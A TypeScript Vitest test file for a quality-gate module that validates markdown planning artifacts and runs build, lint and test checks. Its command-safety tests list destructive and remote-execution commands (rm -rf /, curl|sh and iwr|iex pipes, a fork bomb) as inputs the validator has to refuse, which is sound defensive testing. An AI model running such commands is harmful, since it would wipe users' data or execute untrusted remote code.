import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { mkdir, rm, writeFile } from "node:fs/promises";

import {
  checkRequiredFields,
  evaluateQuality,
  generateQualityReport,
  formatQualityReport,
  detectAvailableCommand,
  runExternalCheck,
  sanityCheckCheckCommand,
} from "./gate.js";

// ─── Fixtures ─────────────────────────────────────────────────────────────────

const FULL_CLARIFIED_PRODUCT = `
# Clarified Product: Example

## Vision
A clear, one-sentence product vision.

## Measurable Goals
- Goal 1 with metric
- Goal 2 with metric

## Key Requirements
1. Requirement A
2. Requirement B

## Users and Stakeholders
- **Primary users**: developers
- **Stakeholders**: product team

## Constraints
- Must run on Node.js 20+
- No external runtime dependencies

## Success Criteria
- All tests pass with >90% coverage
- Startup time under 200ms

## Out of Scope
- GUI interface
- Cloud sync
`.trim();

const FULL_ACTION_PLAN = `
# Action Plan: Example

## Tasks

### Task 1: Setup
- **Description**: Initialize project structure
- **Criteria**: package.json exists, src/ created
- **Notes**: npm init -y

### Task 2: Core feature
- **Description**: Implement main logic
- **Criteria**: unit tests pass
`.trim();

const FULL_REVIEW_REPORT = `
# Review Report

## Summary
All tasks completed successfully.

## Task Details
- Task 1: done
- Task 2: done

## Decision
Ship — no blockers found.
`.trim();

// ─── checkRequiredFields ─────────────────────────────────────────────────────

describe("checkRequiredFields", () => {
  it("returns valid with empty missingFields for unknown artifact type", () => {
    const result = checkRequiredFields("unknown", "## Something\ncontent");
    expect(result.isValid).toBe(true);
    expect(result.missingFields).toEqual([]);
    expect(result.presentFields).toEqual([]);
  });

  it("validates a complete clarifiedProduct as valid", () => {
    const result = checkRequiredFields("clarifiedProduct", FULL_CLARIFIED_PRODUCT);
    expect(result.isValid).toBe(true);
    expect(result.missingFields).toEqual([]);
    expect(result.presentFields.length).toBeGreaterThan(0);
  });

  it("detects missing fields in an incomplete clarifiedProduct", () => {
    const content = "## Vision\nA short vision.";
    const result = checkRequiredFields("clarifiedProduct", content);
    expect(result.isValid).toBe(false);
    expect(result.missingFields).toContain("Measurable Goals");
    expect(result.missingFields).toContain("Key Requirements");
    expect(result.presentFields).toContain("Vision");
  });

  it("accepts bold markers as an alternative to headers", () => {
    const content = [
      "**Vision**\ntest",
      "**Measurable Goals**\n- g1",
      "**Key Requirements**\n- r1",
      "**Users**\n- u1",
      "**Constraints**\n- c1",
      "**Success Criteria**\n- s1",
      "**Out of Scope**\n- o1",
    ].join("\n");
    const result = checkRequiredFields("clarifiedProduct", content);
    expect(result.isValid).toBe(true);
  });

  it("validates a complete actionPlan", () => {
    const result = checkRequiredFields("actionPlan", FULL_ACTION_PLAN);
    expect(result.isValid).toBe(true);
  });

  it("detects missing Tasks section in actionPlan", () => {
    const result = checkRequiredFields("actionPlan", "## Architecture\nsome text");
    expect(result.isValid).toBe(false);
    expect(result.missingFields).toContain("Tasks");
  });

  it("validates a complete reviewReport", () => {
    const result = checkRequiredFields("reviewReport", FULL_REVIEW_REPORT);
    expect(result.isValid).toBe(true);
  });

  it("warns when content is very short", () => {
    const result = checkRequiredFields("actionPlan", "## Tasks\n- t");
    expect(result.warnings.some((w) => w.includes("short"))).toBe(true);
  });

  it("warns when there are few list items", () => {
    const result = checkRequiredFields("actionPlan", "## Tasks\n- only one item" + " x".repeat(100));
    expect(result.warnings.some((w) => w.toLowerCase().includes("list"))).toBe(true);
  });

  it("does not warn about list items for reviewReport", () => {
    const result = checkRequiredFields("reviewReport", FULL_REVIEW_REPORT);
    const listWarning = result.warnings.some((w) => w.toLowerCase().includes("list"));
    expect(listWarning).toBe(false);
  });
});

// ─── evaluateQuality ─────────────────────────────────────────────────────────

describe("evaluateQuality", () => {
  it("returns a score between 1 and 10", () => {
    const result = evaluateQuality("actionPlan", FULL_ACTION_PLAN);
    expect(result.score).toBeGreaterThanOrEqual(1);
    expect(result.score).toBeLessThanOrEqual(10);
  });

  it("summary reports the clamped score, not the raw running total", () => {
    // Empty content with many missing fields would push the raw score below 1.
    // The summary must reflect the clamped (returned) score, not the raw value.
    const result = evaluateQuality("clarifiedProduct", "## Vision\nshort");
    const match = result.summary.match(/Quality: (-?\d+)\/10/);
    expect(match).not.toBeNull();
    const summaryScore = Number(match![1]);
    expect(summaryScore).toBe(result.score);
    expect(summaryScore).toBeGreaterThanOrEqual(1);
    expect(summaryScore).toBeLessThanOrEqual(10);
  });

  it("scores a complete artifact higher than an incomplete one", () => {
    const full = evaluateQuality("clarifiedProduct", FULL_CLARIFIED_PRODUCT);
    const empty = evaluateQuality("clarifiedProduct", "## Vision\nshort");
    expect(full.score).toBeGreaterThan(empty.score);
  });

  it("includes suggestions when fields are missing", () => {
    const result = evaluateQuality("clarifiedProduct", "## Vision\ntest");
    expect(result.suggestions.some((s) => s.toLowerCase().includes("missing"))).toBe(true);
  });

  it("includes a confirmation message when all fields are present", () => {
    const result = evaluateQuality("clarifiedProduct", FULL_CLARIFIED_PRODUCT);
    expect(
      result.suggestions.some((s) =>
        s.toLowerCase().includes("all required fields present"),
      ),
    ).toBe(true);
  });
});

// ─── False-positive resistance (regex hardening) ─────────────────────────────

describe("checkRequiredFields — false-positive resistance", () => {
  it("does not match a header whose name is only a prefix (e.g. Visionary)", () => {
    const content = `## Visionary statement\nLong-term outlook.\n## Out of Scope\n- ...`;
    const result = checkRequiredFields("clarifiedProduct", content);
    expect(result.presentFields).not.toContain("Vision");
  });

  it("does not match a bold marker embedded in prose (e.g. **Vision was good**)", () => {
    const content = "Some narrative: the **Vision was good** but incomplete.";
    const result = checkRequiredFields("clarifiedProduct", content);
    expect(result.presentFields).not.toContain("Vision");
  });

  it("does not match an unclosed bold marker", () => {
    // No closing `**` after the field name → must not count as present.
    const content = "**Vision is the goal\n";
    const result = checkRequiredFields("clarifiedProduct", content);
    expect(result.presentFields).not.toContain("Vision");
  });

  it("accepts a closed bold marker at start of line", () => {
    const content = "**Vision**\nLong-term outlook.\n";
    const result = checkRequiredFields("clarifiedProduct", content);
    expect(result.presentFields).toContain("Vision");
  });
});

// ─── detectAvailableCommand — config override ────────────────────────────────

describe("detectAvailableCommand — config overrides", () => {
  let dir: string;

  beforeEach(async () => {
    dir = join(tmpdir(), `pi-lean-flow-override-${Date.now()}-${Math.random()}`);
    await mkdir(dir, { recursive: true });
  });

  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  it("honors .pi-lean-flow/config.json checks override", async () => {
    await mkdir(join(dir, ".pi-lean-flow"), { recursive: true });
    await writeFile(
      join(dir, ".pi-lean-flow", "config.json"),
      JSON.stringify({ checks: { compile: "yarn build" } }),
      "utf-8",
    );
    expect(detectAvailableCommand("compile", dir)).toBe("yarn build");
  });

  it("falls back to npm script when no override is present", async () => {
    await writeFile(
      join(dir, "package.json"),
      JSON.stringify({ scripts: { build: "tsc" } }),
      "utf-8",
    );
    expect(detectAvailableCommand("compile", dir)).toBe("npm run build");
  });

  it("honors .pi-lean-flow/config.json per-check timeout (kills slow script)", async () => {
    // Drive the check via an explicit command override so the test doesn't
    // pay the npm bootstrap cost on Windows. We still exercise the same
    // timeout-config code path.
    await mkdir(join(dir, ".pi-lean-flow"), { recursive: true });
    const slowCmd =
      process.platform === "win32"
        ? "ping -n 30 127.0.0.1 > NUL"
        : "sleep 30";
    await writeFile(
      join(dir, ".pi-lean-flow", "config.json"),
      JSON.stringify({
        checks: { compile: slowCmd },
        timeouts: { compile: 500 },
      }),
      "utf-8",
    );
    const result = await runExternalCheck("compile", dir);
    expect(result.passed).toBe(false);
    expect(result.errors.some((e) => e.toLowerCase().includes("timed out"))).toBe(true);
  }, 15000);
});

// ─── detectAvailableCommand ──────────────────────────────────────────────────

describe("detectAvailableCommand", () => {
  let dir: string;

  beforeEach(async () => {
    dir = join(tmpdir(), `pi-lean-flow-detect-${Date.now()}-${Math.random()}`);
    await mkdir(dir, { recursive: true });
  });

  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  it("returns null for every check type when no project files exist", () => {
    expect(detectAvailableCommand("compile", dir)).toBeNull();
    expect(detectAvailableCommand("lint", dir)).toBeNull();
    expect(detectAvailableCommand("test", dir)).toBeNull();
    expect(detectAvailableCommand("typecheck", dir)).toBeNull();
  });

  it("detects npm scripts when present in package.json", async () => {
    await writeFile(
      join(dir, "package.json"),
      JSON.stringify({
        scripts: { build: "tsc", lint: "eslint .", test: "vitest run" },
      }),
      "utf-8",
    );
    expect(detectAvailableCommand("compile", dir)).toBe("npm run build");
    expect(detectAvailableCommand("lint", dir)).toBe("npm run lint");
    expect(detectAvailableCommand("test", dir)).toBe("npm test");
  });

  it("prefers npm script 'build' over 'compile' for the compile check", async () => {
    await writeFile(
      join(dir, "package.json"),
      JSON.stringify({ scripts: { build: "echo b", compile: "echo c" } }),
      "utf-8",
    );
    expect(detectAvailableCommand("compile", dir)).toBe("npm run build");
  });

  it("falls back to tsc --noEmit for typecheck when tsconfig.json exists", async () => {
    await writeFile(join(dir, "tsconfig.json"), "{}", "utf-8");
    expect(detectAvailableCommand("typecheck", dir)).toBe("npx tsc --noEmit");
  });

  it("returns null for unknown check type", () => {
    expect(detectAvailableCommand("unknown", dir)).toBeNull();
  });

  it("returns null when package.json is malformed", async () => {
    await writeFile(join(dir, "package.json"), "{ invalid json", "utf-8");
    expect(detectAvailableCommand("compile", dir)).toBeNull();
  });

  it("returns null when package.json is an array (not an object)", async () => {
    // Defensive parsing: a hand-edited file could be top-level array.
    await writeFile(join(dir, "package.json"), "[]", "utf-8");
    expect(detectAvailableCommand("compile", dir)).toBeNull();
  });

  it("returns null when package.json has scripts as non-object", async () => {
    await writeFile(
      join(dir, "package.json"),
      JSON.stringify({ scripts: "build" }),
      "utf-8",
    );
    expect(detectAvailableCommand("compile", dir)).toBeNull();
  });

  it("detects format script when present", async () => {
    await writeFile(
      join(dir, "package.json"),
      JSON.stringify({ scripts: { format: "prettier --write ." } }),
      "utf-8",
    );
    expect(detectAvailableCommand("format", dir)).toBe("npm run format");
  });

  it("prefers format:check over format for the format check", async () => {
    await writeFile(
      join(dir, "package.json"),
      JSON.stringify({
        scripts: { "format:check": "prettier --check .", format: "prettier --write ." },
      }),
      "utf-8",
    );
    expect(detectAvailableCommand("format", dir)).toBe("npm run format:check");
  });

  it("falls back to npx prettier --check when .prettierrc is present", async () => {
    await writeFile(join(dir, ".prettierrc"), "{}", "utf-8");
    expect(detectAvailableCommand("format", dir)).toBe("npx prettier --check .");
  });

  it("falls back to npx biome when biome.json is present", async () => {
    await writeFile(join(dir, "biome.json"), "{}", "utf-8");
    expect(detectAvailableCommand("format", dir)).toBe("npx biome format .");
  });

  it("returns null for format check when nothing is configured", () => {
    expect(detectAvailableCommand("format", dir)).toBeNull();
  });
});

// ─── case-insensitive field check ────────────────────────────────────────────

describe("checkRequiredFields — case-insensitive matching", () => {
  it("accepts lowercase headers", () => {
    const content = [
      "## vision\ntest",
      "## measurable goals\n- g1",
      "## key requirements\n- r1",
      "## users\n- u1",
      "## constraints\n- c1",
      "## success criteria\n- s1",
      "## out of scope\n- o1",
    ].join("\n");
    const result = checkRequiredFields("clarifiedProduct", content);
    expect(result.isValid).toBe(true);
  });

  it("accepts uppercase headers", () => {
    const content = "## TASKS\n- t1\n- t2";
    const result = checkRequiredFields("actionPlan", content);
    expect(result.isValid).toBe(true);
  });

  it("accepts mixed-case bold markers", () => {
    const content = "**TaSkS**\n- t1";
    const result = checkRequiredFields("actionPlan", content);
    expect(result.isValid).toBe(true);
  });
});

// ─── runExternalCheck ────────────────────────────────────────────────────────

describe("runExternalCheck", () => {
  let dir: string;

  beforeEach(async () => {
    dir = join(tmpdir(), `pi-lean-flow-run-${Date.now()}-${Math.random()}`);
    await mkdir(dir, { recursive: true });
  });

  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  it("marks the result as skipped (not passed) when no tool is configured", async () => {
    const result = await runExternalCheck("compile", dir);
    expect(result.skipped).toBe(true);
    expect(result.passed).toBe(false);
    expect(result.status).toBe("skipped");
    expect(result.errors).toEqual([]);
  });

  it("rejects unknown check types without marking them as skipped", async () => {
    const result = await runExternalCheck("nope", dir);
    expect(result.passed).toBe(false);
    expect(result.skipped).not.toBe(true);
    expect(result.errors.length).toBeGreaterThan(0);
  });

  it("reports passed=true when the configured script exits 0", async () => {
    await writeFile(
      join(dir, "package.json"),
      JSON.stringify({
        name: "fixture",
        version: "0.0.0",
        scripts: { build: "exit 0" },
      }),
      "utf-8",
    );
    const result = await runExternalCheck("compile", dir);
    expect(result.passed).toBe(true);
    expect(result.status).toBe("passed");
    expect(result.skipped).not.toBe(true);
  }, 30000);

  it("reports passed=false when the configured script exits non-zero", async () => {
    await writeFile(
      join(dir, "package.json"),
      JSON.stringify({
        name: "fixture",
        version: "0.0.0",
        scripts: { build: "exit 1" },
      }),
      "utf-8",
    );
    const result = await runExternalCheck("compile", dir);
    expect(result.passed).toBe(false);
    expect(result.status).toBe("failed");
    expect(result.skipped).not.toBe(true);
  }, 30000);

  it("rejects unknown check types with status=failed (not skipped)", async () => {
    const result = await runExternalCheck("nope", dir);
    expect(result.status).toBe("failed");
    expect(result.skipped).not.toBe(true);
  });

  it("refuses to spawn dangerous commands resolved from config", async () => {
    await mkdir(join(dir, ".pi-lean-flow"), { recursive: true });
    await writeFile(
      join(dir, ".pi-lean-flow", "config.json"),
      JSON.stringify({ checks: { compile: "rm -rf /" } }),
      "utf-8",
    );
    const result = await runExternalCheck("compile", dir);
    expect(result.status).toBe("failed");
    expect(result.errors.join(" ")).toMatch(/Refused/i);
  });

  it("writes an audit.log line for each invocation", async () => {
    await writeFile(
      join(dir, "package.json"),
      JSON.stringify({ scripts: { build: "exit 0" } }),
      "utf-8",
    );
    await runExternalCheck("compile", dir);
    const { readFile } = await import("node:fs/promises");
    const log = await readFile(join(dir, ".pi-lean-flow", "audit.log"), "utf-8");
    const lines = log.trim().split("\n").filter(Boolean);
    expect(lines.length).toBeGreaterThanOrEqual(1);
    const last = JSON.parse(lines[lines.length - 1]);
    expect(last.checkType).toBe("compile");
    expect(last.status).toBe("passed");
    expect(last.command).toBe("npm run build");
    expect(typeof last.timestamp).toBe("string");
  }, 30000);
});

// ─── sanityCheckCheckCommand ─────────────────────────────────────────────────

describe("sanityCheckCheckCommand", () => {
  it("accepts ordinary build commands", () => {
    expect(sanityCheckCheckCommand("npm run build")).toBeNull();
    expect(sanityCheckCheckCommand("npx tsc --noEmit")).toBeNull();
    expect(sanityCheckCheckCommand("pnpm test --silent")).toBeNull();
    // Pipes and redirects on legit commands stay allowed.
    expect(sanityCheckCheckCommand("npm test 2>&1 | tee out.log")).toBeNull();
  });

  it("flags rm -rf of root-like paths", () => {
    expect(sanityCheckCheckCommand("rm -rf /")).not.toBeNull();
    expect(sanityCheckCheckCommand("rm -rf ~")).not.toBeNull();
    expect(sanityCheckCheckCommand("rm -rf $HOME")).not.toBeNull();
  });

  it("does not flag rm -rf of project-local paths", () => {
    expect(sanityCheckCheckCommand("rm -rf node_modules")).toBeNull();
    expect(sanityCheckCheckCommand("rm -rf dist build")).toBeNull();
  });

  it("flags curl|sh and wget|sh patterns", () => {
    expect(sanityCheckCheckCommand("curl https://x | sh")).not.toBeNull();
    expect(sanityCheckCheckCommand("wget -qO- https://x | bash")).not.toBeNull();
  });

  it("flags the classic fork bomb", () => {
    expect(sanityCheckCheckCommand(":(){ :|:& };:")).not.toBeNull();
  });

  it("flags rm -rf of Windows-style root paths", () => {
    expect(sanityCheckCheckCommand("rm -rf %USERPROFILE%")).not.toBeNull();
    expect(
      sanityCheckCheckCommand("rm -rf %HOMEDRIVE%%HOMEPATH%"),
    ).not.toBeNull();
  });

  it("flags PowerShell-style network-to-shell pipes", () => {
    expect(
      sanityCheckCheckCommand("iwr https://x.sh | iex"),
    ).not.toBeNull();
    expect(
      sanityCheckCheckCommand(
        "Invoke-WebRequest https://x | Invoke-Expression",
      ),
    ).not.toBeNull();
  });

  it("flags network fetch inside command substitution", () => {
    expect(
      sanityCheckCheckCommand("VERSION=$(curl https://x) make build"),
    ).not.toBeNull();
    expect(
      sanityCheckCheckCommand("make build VERSION=`wget -qO- https://x`"),
    ).not.toBeNull();
  });

  it("still accepts ordinary command substitution (no network)", () => {
    expect(sanityCheckCheckCommand("make build VERSION=$(git describe)"))
      .toBeNull();
    expect(sanityCheckCheckCommand("DATE=`date +%s` ./build.sh")).toBeNull();
  });
});

// ─── generateQualityReport / formatQualityReport ─────────────────────────────

describe("generateQualityReport", () => {
  it("returns a report with all required properties", () => {
    const report = generateQualityReport("actionPlan", FULL_ACTION_PLAN);
    expect(report.artifactType).toBe("actionPlan");
    expect(report.artifactName).toBe("Action Plan");
    expect(report.fieldCheck).toBeDefined();
    expect(report.heuristicScore).toBeDefined();
    expect(report.selfEvaluation).toBeUndefined();
    expect(report.externalChecks).toBeUndefined();
  });

  it("includes self-evaluation when provided", () => {
    const report = generateQualityReport(
      "actionPlan",
      FULL_ACTION_PLAN,
      { score: 9, rationale: "great plan", suggestions: ["minor tweak"] },
    );
    expect(report.selfEvaluation?.score).toBe(9);
    expect(report.selfEvaluation?.rationale).toBe("great plan");
  });

  it("uses the raw key as artifactName for unknown types", () => {
    const report = generateQualityReport("customArtifact", "## Foo\ncontent");
    expect(report.artifactName).toBe("customArtifact");
  });
});

describe("formatQualityReport", () => {
  it("produces a Markdown string with a top-level heading", () => {
    const report = generateQualityReport("actionPlan", FULL_ACTION_PLAN);
    const md = formatQualityReport(report);
    expect(md).toMatch(/^# Quality Report/m);
  });

  it("reports all-present when all required fields are provided", () => {
    const report = generateQualityReport("actionPlan", FULL_ACTION_PLAN);
    const md = formatQualityReport(report);
    expect(md).toContain("Required fields: all present");
  });

  it("reports missing-count when required fields are missing", () => {
    const report = generateQualityReport("actionPlan", "## Architecture\nsome text");
    const md = formatQualityReport(report);
    expect(md).toMatch(/Required fields: \d+ missing/);
  });

  it("includes the automated evaluation score", () => {
    const report = generateQualityReport("actionPlan", FULL_ACTION_PLAN);
    const md = formatQualityReport(report);
    expect(md).toMatch(/Automated evaluation: \d+\/10/);
  });

  it("includes the LLM self-evaluation section when provided", () => {
    const report = generateQualityReport(
      "reviewReport",
      FULL_REVIEW_REPORT,
      { score: 7, rationale: "solid review", suggestions: [] },
    );
    const md = formatQualityReport(report);
    expect(md).toContain("Self-evaluation (LLM): 7/10");
    expect(md).toContain("solid review");
  });

  it("includes external checks section when provided", () => {
    const report = generateQualityReport("actionPlan", FULL_ACTION_PLAN, undefined, [
      { checkType: "compile", passed: true, output: "OK", errors: [], durationMs: 120 },
      { checkType: "test", passed: false, output: "", errors: ["1 failing"], durationMs: 300 },
    ]);
    const md = formatQualityReport(report);
    expect(md).toContain("External checks");
    expect(md).toContain("compile");
    expect(md).toContain("test");
    expect(md).toContain("1 failing");
  });

  it("renders skipped checks with the skipped status, not as failed", () => {
    const report = generateQualityReport("actionPlan", FULL_ACTION_PLAN, undefined, [
      {
        checkType: "lint",
        passed: false,
        skipped: true,
        output: "No lint configured.",
        errors: [],
        durationMs: 0,
      },
    ]);
    const md = formatQualityReport(report);
    expect(md).toContain("skipped");
    expect(md).toContain("lint");
  });
});
